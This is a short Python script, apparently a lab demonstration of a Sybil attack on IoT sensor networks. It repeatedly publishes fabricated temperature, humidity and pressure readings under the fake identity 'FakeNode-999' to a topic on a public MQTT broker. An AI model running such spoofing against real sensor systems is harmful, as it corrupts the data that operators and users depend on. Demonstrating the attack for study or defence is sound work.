import json
import time
import paho.mqtt.publish as publish

fake_data = {
    "Temperature": 25.0,
    "Humidity": 50.0,
    "Pressure": 1000.0,
    "node_id": "FakeNode-999",
    "timestamp": time.time()
}

print("🕵️ Starting Sybil Attack...")
for i in range(3):
    fake_data["timestamp"] = time.time()
    publish.single("iot/sensors", json.dumps(fake_data), hostname="broker.hivemq.com")
    print(f"[{i+1}] Sent spoofed identity packet:", fake_data)
    time.sleep(2)